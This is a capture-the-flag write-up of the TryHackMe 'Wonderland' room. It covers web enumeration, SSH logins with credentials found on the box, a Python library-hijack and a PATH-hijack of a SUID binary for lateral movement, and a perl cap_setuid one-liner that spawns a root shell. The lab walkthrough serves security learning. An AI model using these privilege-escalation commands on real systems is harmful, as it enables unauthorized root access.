# Wonderland 
Fall down the rabbit hole and enter wonderland.

### Difficulty: Medium

##  Task 1 Capture the flags
+ Obtain the flag in user.txt
+ Escalate your privileges, what is the flag in root.txt?

+ Gatering Information
    - nmap `nmap -sC -sV 10.201.72.120 > nmap_wonderland`
    ```bash
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
    |   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
    |_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
    80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    |_http-title: Follow the white rabbit.
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    - gobuster 
    `gobuster dir -u http://10.201.72.120/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
    ```bash

    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.201.72.120/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /img                  (Status: 301) [Size: 0] [--> img/]
    /r                    (Status: 301) [Size: 0] [--> r/]
    Progress: 6833 / 220561 (3.10%)[ERROR] Get "http://10.201.72.120/celeb": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
    Progress: 20152 / 220561 (9.14%)^C
    [!] Keyboard interrupt detected, terminating.
    Progress: 20162 / 220561 (9.14%)
    ===============================================================
    Finished
    ===============================================================
    ```
    `gobuster dir -u http://10.201.72.120/r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
    ```bash
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.201.72.120/r
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /a                    (Status: 301) [Size: 0] [--> a/]
    Progress: 1046 / 220561 (0.47%)^C
    [!] Keyboard interrupt detected, terminating.
    Progress: 1056 / 220561 (0.48%)
    ===============================================================
    Finished
    ===============================================================
    ```

    `gobuster dir -u http://10.201.72.120/r/a -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
    ```bash
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.201.72.120/r/a
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /b                    (Status: 301) [Size: 0] [--> b/]
    Progress: 1216 / 220561 (0.55%)^C
    [!] Keyboard interrupt detected, terminating.
    Progress: 1226 / 220561 (0.56%)
    ===============================================================
    Finished
    ===============================================================
    ```

    `gobuster dir -u http://10.201.72.120/r/a/b -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
    ```bash
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.201.72.120/r/a/b
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /b                    (Status: 301) [Size: 0] [--> b/]
    [!] Keyboard interrupt detected, terminating.
    Progress: 7741 / 220561 (3.51%)
    ===============================================================
    Finished
    ===============================================================
    ```

    `gobuster dir -u http://10.201.72.120/r/a/b/b -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
    ```bash
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.201.72.120/r/a/b/b
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /i                    (Status: 301) [Size: 0] [--> i/]
    Progress: 910 / 220561 (0.41%)^C
    [!] Keyboard interrupt detected, terminating.
    Progress: 928 / 220561 (0.42%)
    ===============================================================
    Finished
    ===============================================================
    ```
    `gobuster dir -u http://10.201.72.120/r/a/b/b/i -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
    ```bash
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.201.72.120/r/a/b/b/i
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /t                    (Status: 301) [Size: 0] [--> t/]
    Progress: 434 / 220561 (0.20%)^C
    [!] Keyboard interrupt detected, terminating.
    Progress: 439 / 220561 (0.20%)
    ===============================================================
    Finished
    ===============================================================
    ```

    result `http://10.201.72.120/r/a/b/b/i/t/`

    look in incspect page there is a hidden paragraph
    `alice:HowDothTheLittleCrocodileImproveHisShiningTail`
                                                        
+ Enumeration
    - SSH with credential `alice:HowDothTheLittleCrocodileImproveHisShiningTail`
        ```bash
        ssh alice@10.201.72.120
        The authenticity of host '10.201.72.120 (10.201.72.120)' can't be established.
        ED25519 key fingerprint is SHA256:Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo.
        This key is not known by any other names.
        Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
        Warning: Permanently added '10.201.72.120' (ED25519) to the list of known hosts.
        alice@10.201.72.120's password: 
        Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

        * Documentation:  https://help.ubuntu.com
        * Management:     https://landscape.canonical.com
        * Support:        https://ubuntu.com/advantage

        System information as of Mon Sep  8 09:24:21 UTC 2025

        System load:  0.0                Processes:           88
        Usage of /:   18.9% of 19.56GB   Users logged in:     0
        Memory usage: 30%                IP address for ens5: 10.201.72.120
        Swap usage:   0%


        0 packages can be updated.
        0 updates are security updates.


        Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
        alice@wonderland:~$ ls -la
        total 40                                                                                                                                            
        drwxr-xr-x 5 alice alice 4096 May 25  2020 .                                                                                                        
        drwxr-xr-x 6 root  root  4096 May 25  2020 ..                                                                                                       
        lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null                                                                               
        -rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout                                                                                             
        -rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc                                                                                                  
        drwx------ 2 alice alice 4096 May 25  2020 .cache                                                                                                   
        drwx------ 3 alice alice 4096 May 25  2020 .gnupg                                                                                                   
        drwxrwxr-x 3 alice alice 4096 May 25  2020 .local                                                                                                   
        -rw-r--r-- 1 alice alice  807 May 25  2020 .profile                                                                                                 
        -rw------- 1 root  root    66 May 25  2020 root.txt                                                                                                 
        -rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py                                                                              
        alice@wonderland:~$       
        ```

    - Checking `walrus_and_the_carpenter.py`
        ```bash 
        import random
        poem = """The sun was shining on the sea,
        Shining with all his might:
        He did his very best to make
        The billows smooth and bright —
        And this was odd, because it was
        The middle of the night.

        The moon was shining sulkily,
        Because she thought the sun
        Had got no business to be there
        After the day was done —
        "It’s very rude of him," she said,
        "To come and spoil the fun!"

        The sea was wet as wet could be,
        The sands were dry as dry.
        You could not see a cloud, because
        No cloud was in the sky:
        No birds were flying over head —
        There were no birds to fly.

        The Walrus and the Carpenter
        Were walking close at hand;
        They wept like anything to see
        Such quantities of sand:
        "If this were only cleared away,"
        They said, "it would be grand!"

        "If seven maids with seven mops
        Swept it for half a year,
        Do you suppose," the Walrus said,
        "That they could get it clear?"
        "I doubt it," said the Carpenter,
        And shed a bitter tear.

        "O Oysters, come and walk with us!"
        The Walrus did beseech.
        "A pleasant walk, a pleasant talk,
        Along the briny beach:
        We cannot do with more than four,
        To give a hand to each."

        The eldest Oyster looked at him.
        But never a word he said:
        The eldest Oyster winked his eye,
        And shook his heavy head —
        Meaning to say he did not choose
        To leave the oyster-bed.

        But four young oysters hurried up,
        All eager for the treat:
        Their coats were brushed, their faces washed,
        Their shoes were clean and neat —
        And this was odd, because, you know,
        They hadn’t any feet.

        Four other Oysters followed them,
        And yet another four;
        And thick and fast they came at last,
        And more, and more, and more —
        All hopping through the frothy waves,
        And scrambling to the shore.

        The Walrus and the Carpenter
        Walked on a mile or so,
        And then they rested on a rock
        Conveniently low:
        And all the little Oysters stood
        And waited in a row.

        "The time has come," the Walrus said,
        "To talk of many things:
        Of shoes — and ships — and sealing-wax —
        Of cabbages — and kings —
        And why the sea is boiling hot —
        And whether pigs have wings."

        "But wait a bit," the Oysters cried,
        "Before we have our chat;
        For some of us are out of breath,
        And all of us are fat!"
        "No hurry!" said the Carpenter.
        They thanked him much for that.

        "A loaf of bread," the Walrus said,
        "Is what we chiefly need:
        Pepper and vinegar besides
        Are very good indeed —
        Now if you’re ready Oysters dear,
        We can begin to feed."

        "But not on us!" the Oysters cried,
        Turning a little blue,
        "After such kindness, that would be
        A dismal thing to do!"
        "The night is fine," the Walrus said
        "Do you admire the view?

        "It was so kind of you to come!
        And you are very nice!"
        The Carpenter said nothing but
        "Cut us another slice:
        I wish you were not quite so deaf —
        I’ve had to ask you twice!"

        "It seems a shame," the Walrus said,
        "To play them such a trick,
        After we’ve brought them out so far,
        And made them trot so quick!"
        The Carpenter said nothing but
        "The butter’s spread too thick!"

        "I weep for you," the Walrus said.
        "I deeply sympathize."
        With sobs and tears he sorted out
        Those of the largest size.
        Holding his pocket handkerchief
        Before his streaming eyes.

        "O Oysters," said the Carpenter.
        "You’ve had a pleasant run!
        Shall we be trotting home again?"
        But answer came there none —
        And that was scarcely odd, because
        They’d eaten every one."""

        for i in range(10):
            line = random.choice(poem.split("\n"))
            print("The line was:\t", line)
        ```
        ```bash
        alice@wonderland:~$ ls /home

        alice  hatter  rabbit  tryhackme
        ```

        ```bash
        alice@wonderland:~$ cat /etc/passwd

        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        sync:x:4:65534:sync:/bin:/bin/sync
        games:x:5:60:games:/usr/games:/usr/sbin/nologin
        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
        irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
        systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
        systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
        syslog:x:102:106::/home/syslog:/usr/sbin/nologin
        messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
        _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
        lxd:x:105:65534::/var/lib/lxd/:/bin/false
        uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
        dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
        landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
        pollinate:x:109:1::/var/cache/pollinate:/bin/false
        sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
        tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
        alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
        hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
        rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
        ```
        ```bash
        alice@wonderland:~$ sudo -l

        [sudo] password for alice: 
        Matching Defaults entries for alice on wonderland:
            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

        User alice may run the following commands on wonderland:
            (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
        ```

+ Priviledge Escalation
    - From useralice Abusing python alrus_and_the_carpenter.py with random
    - Create file random.py on the same folder with script on /home.alice
    - script
    ```python
    #!/usr/bin/env python

    import os
    os.system('/bin/bash')
    ```
    - Run script with sudo permission `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
    - Check home folder of rabbit
    ```bash
    rabbit@wonderland:/home/rabbit$ ls -la

    total 40
    drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
    drwxr-xr-x 6 root   root    4096 May 25  2020 ..
    lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
    -rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
    -rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
    -rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
    -rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
    ```

    ```bash
    rabbit@wonderland:/home/rabbit$ file teaParty

    5a832557e341d3f65157c22fafd6d6ed7413474, not stripped

    rabbit@wonderland:/home/rabbit$ echo $PATH
    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

    ```

    - File teaParty is a ELF bynary file and is's call /bin/echo with full path and using `date` eithout full path can we abuse this ?
    - Create bash file with name is `date` and update path on first checking
    ```bash
    rabbit@wonderland:/home/rabbit$ echo $PATH

    /home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

    #!/bin/bash

    /bash -p
    ```
    ```bash
    rabbit@wonderland:/home/rabbit$ ./teaParty

    Welcome to the tea party!
    The Mad Hatter will be here soon.
    ```
    ```bash
    Probably by hatter@wonderland:/home/rabbit$ whoami

    hatter
    ```
    - We take `password.txt` in here
    ```bash
    hatter@wonderland:/home/rabbit$ cd ../hatter
    hatter@wonderland:/home/hatter$ ls -la

    total 28
    drwxr-x--- 3 hatter hatter 4096 May 25  2020 .
    drwxr-xr-x 6 root   root   4096 May 25  2020 ..
    lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
    -rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
    -rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
    drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
    -rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
    -rw------- 1 hatter hatter   29 May 25  2020 password.txt
    hatter@wonderland:/home/hatter$ cat password.txt
    WhyIsARavenLikeAWritingDesk?
    ```
    - SSH to hatter with password `WhyIsARavenLikeAWritingDesk?`
    ```bash
    ssh hatter@10.201.72.120

    hatter@10.201.72.120's password: 
    Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/advantage

    System information as of Mon Sep  8 10:22:48 UTC 2025

    System load:  0.0                Processes:           101
    Usage of /:   18.9% of 19.56GB   Users logged in:     1
    Memory usage: 33%                IP address for ens5: 10.201.72.120
    Swap usage:   0%


    0 packages can be updated.
    0 updates are security updates.

    Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.
    ```

    - Running linpeas.sh

    <!-- Sudo version 1.8.21p2

    [CVE-2021-4034]  -->

    <!-- /tmp/tmux-1003 -->

    Files with capabilities (limited to 50):

    /usr/bin/perl5.26.1 = cap_setuid+ep

    `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
    ```bash
    # whoami
    root
    ```
    Obtain the flag in user.txt
    ```bash
    # /bin/bash -p
    root@wonderland:/root# ls

    user.txt
    root@wonderland:/root# cat user.txt
    thm{********}
    ```
    Escalate your privileges, what is the flag in root.txt?
    ```bash
    root@wonderland:/root# cat /home/alice/root.txt
    thm{********}
    root@wonderland:/root# 
    ```




